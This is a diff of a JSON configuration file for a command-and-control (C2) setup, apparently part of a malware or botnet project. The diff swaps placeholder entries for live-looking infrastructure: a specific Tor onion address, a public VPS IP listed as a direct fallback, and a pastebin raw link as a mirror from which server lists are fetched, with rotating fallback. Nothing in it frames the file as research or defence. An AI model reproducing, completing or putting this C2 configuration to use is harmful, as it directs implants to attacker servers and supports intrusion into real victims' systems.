@@ -1,11 +1,11 @@
 {
   "version": "1.0",
-  "last_updated": "2025-11-08T00:00:00Z",
+  "last_updated": "2025-11-09T12:59:57.126336Z",
   "c2_servers": [
     {
       "id": "primary",
       "type": "tor_hidden",
-      "address": "YOUR_ONION_ADDRESS.onion",
+      "address": "ywiupsrdublzznfjnsrsdhq6pc5uyza6plh2je6y4bxukm6eal4yn6yd.onion",
       "port": 8443,
       "use_tor": true,
       "priority": 1,
@@ -15,17 +15,16 @@
     {
       "id": "fallback_1",
       "type": "direct_ip",
-      "address": "192.168.56.1",
+      "address": "93.95.231.134",
       "port": 8443,
       "use_tor": false,
       "priority": 2,
       "status": "active",
-      "description": "IP directa local (backup)"
+      "description": "VPS 1984 IP directa (backup)"
     }
   ],
   "cdn_mirrors": [
-    "https://pastebin.com/raw/YOUR_PASTE_ID",
-    "https://gist.githubusercontent.com/YOUR_USER/YOUR_GIST/raw/c2_servers.json"
+    "https://pastebin.com/raw/1ftfPUa0"
   ],
   "update_interval": 3600,
   "fallback_behavior": "rotate"
